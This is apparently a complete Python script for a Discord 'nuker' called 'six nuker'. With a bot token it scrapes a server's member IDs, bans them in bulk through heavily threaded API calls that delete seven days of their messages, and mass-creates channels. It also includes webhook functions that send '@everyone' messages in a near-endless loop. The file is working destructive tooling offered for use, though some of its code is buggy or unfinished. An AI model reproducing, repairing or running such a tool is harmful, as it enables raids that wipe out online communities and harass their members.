import platform, os, json, discord
from time import sleep
from random import randint, choice
from threading import Thread
from colored import fg
from discord.ext import commands
from colorama import Fore
from discord.ext.commands import bot
from requests_futures.sessions import FuturesSession
s = Fore.RESET
f = Fore.LIGHTBLACK_EX
m = fg("#19ffc2")
g = fg("#00FF00")
b = fg("#FF0000")
intents = discord.Intents.all()
intents.members = True
with open('config.json') as lol:
  config = json.load(lol) 
Token = config.get('token')
minwork = config.get('Min-Workers')
maxwork = config.get('Max-Workers')
cname = config.get("channel-names")
reason = config.get('reason')
webname = config.get('webhook-name')
spam = config.get('spam-msg')
session = FuturesSession(max_workers=randint(minwork,maxwork),)
client = commands.Bot(command_prefix="ffff", case_insensitive=False, intents=intents)
client.remove_command("help")
os.system("cls & mode 70,25 & title six nuker")

headers = {"Authorization": f"Bot {Token}"}

def clear():
    if platform.system().lower() == "windows":
      os.system("cls")
    else:
      os.system("clear")
@client.event
async def on_ready():
  await menu()
async def scrape():
  cum = 0
  guild = input(f"{s}[{m}STATUS{s}] {m}Serverid{s}:{m} ")
  await client.wait_until_ready()
  guil = client.get_guild(int(guild))
  members = await guil.chunk()
  with open('scrapedf.txt', "w+") as p:
    for member in members:
      cum += 1
      p.write(str(member.id) + "\n")
  print(f"{s}[{m}STATUS{s}] [ {m}{cum}{s} ] {m}users scraped in {s}[ {m}{guild} {s}]")
  p.close()
  sleep(2)

def ban(guild, member):
    try:
      r = session.put(f"https://canary.discord.com/api/v{randint(7,9)}/guilds/{guild}/bans/{member}", headers=headers, json={"delete_message_days": 7, "reason": choice(reason)}, stream=True).result()
      if r.status_code == 429:
        print(f"{s}[{m}STATUS{s}] {m}Rate Limited {s}[ {m}{member} {s}] | {m}{r.json['retery_after']}{s}ms")
        members = open('scraped.txt').readlines()
        ts = []
        for _ in range(100, 999):
          for member in members:
            t = Thread(target=ban, args=(guild, member,))
            t.start()
            ts.append(t)
          for t in ts:
            t.join()
      if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print(f'{m}Banned{s}: {m}{member}{s}')
    except:
      pass
def Chook(channel):
    try:
      json = {'name': choice(webname)}
      r = session.post(f"https://canary.discord.com/api/v{randint(7,9)}/channels/{channel}/webhooks", headers=headers, json=json)
      wid = r.json()['id']
      wtoken = r.json('token')
      return f"https://canary.discord.com/api/webhooks/{wid}/{wtoken}"
    except:
      pass
def Shook(hook):
    try:
      for _ in range(9999999):
        payload = {'username': choice(webname), 'content': f"@everyone test"}
        session.post(hook, json=payload)
    except:
      pass
def Cchannel(guild):
    try:
      json = {'name': choice(cname), 'type': 0}
      r = session.post(f'https://discord.com/api/v{randint(6,8)}/guilds/{guild}/channels', headers=headers, json=json).result()
      if r.status_code == 429:
        ts = []
      for i in range(100, 999):
        t = Thread(target=Cchannel, args=(guild, ))
        t.start()
        ts.append(t)
      for t in ts:
        t.join()
      if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        print(f"{s}[{m}STATUS{s}] {m}created channel {s}| {m}{json['id']}{s}")
        #not going to work because it isn't done
        #try:
        #  hook = pix.Chook(r.json['id'])
        #  ts = []
        #  for i in range(100, 999):
        #    t = Thread(target=Shook, args=(hook, ))
        #    t.start()
        #    ts.append(t)
        #  for t in ts:
        #    t.join()
        #except:
        #  pass
    except:
      pass

def ui():
  print(f'''
                          {s}┌─┐  ┬  ─┐ ┬  
                          {f}└─┐  │  ┌┴┬┘  
                          {m}└─┘  ┴  ┴ └─
                {s}[{m}1{s}] {m}Mass Banner  {s}| [{m}2{s}] {m}Webhook Spammer{s}
                {s}[{m}3{s}] {m}Scraper      {s}| [{m}4{s}] {m}Empty{s}
                  
''')
def ui2():
  print(f'''
                          {s}┌─┐  ┬  ─┐ ┬  
                          {f}└─┐  │  ┌┴┬┘  
                          {m}└─┘  ┴  ┴ └─

{s}[ {m}! {s}] {m}Incorrect Token{s}         
''')
async def menu():
  ui()
  while True:
    cmd = input(f"{s}[{m}STATUS{s}] {m}Choice{s}:{m} ")
    if cmd == "1":
      guild = input(f"{s}[{m}STATUS{s}] {m}Serverid{s}:{m} ")
      members = open('scraped.txt').readlines()
      print(f"{s}[{m}STATUS{s}] [ {m}{len(members)}{s} ] {m}users ready to ban for {s}[ {m}{guild} {s}]")
      sleep(3)
      clear()
      ui()
      ts = []
      for _ in range(100, 999):
        for member in members:
          t = Thread(target=ban, args=(guild, member,))
          t.start()
          ts.append(t)
        for t in ts:
          t.join()
    elif cmd == "2":
      guild = input(f"{s}[{m}STATUS{s}] {m}Serverid{s}:{m} ")
      clear()
      ui()
      ts = []
      for i in range(100, 999):
        t = Thread(target=Cchannel, args=(guild, ))
        t.start()
        ts.append(t)
      for t in ts:
        t.join()
    elif cmd == "3":
      await scrape()

def login():
  try:
    client.run(Token)
  except:
    ui2()
    sleep(5)
if __name__ == "__main__":
  login()